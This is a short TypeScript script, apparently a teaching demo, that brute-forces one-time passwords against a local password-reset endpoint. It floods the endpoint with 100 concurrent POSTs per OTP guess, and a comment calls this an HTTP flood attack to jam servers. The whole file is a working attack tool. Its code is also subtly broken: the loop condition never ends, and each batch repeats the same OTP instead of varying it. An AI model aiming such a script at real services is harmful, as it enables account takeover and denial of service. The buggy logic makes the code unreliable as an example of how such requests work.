import axios from "axios";

async function sendRequest(otp: number) {
    let data = JSON.stringify({
        "email": "shashwat123student@gmail.com",
        "otp": otp,
        "password": "123"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };

    try {
        await axios.request(config)
        console.log(`Done for otp ${otp}`);
    } catch (e){

    }
}

async function main(){
    for(let i=0;1000000;i++){
        console.log(i);
        const promises = [];
        for(let j=0;j<100;j++){
            promises.push(sendRequest(i));
        }
        await Promise.all(promises);
    }
}

//This type of attack can also be called as HTTP Flood Attack. Where alot of requests are sent to jam the servers.

main();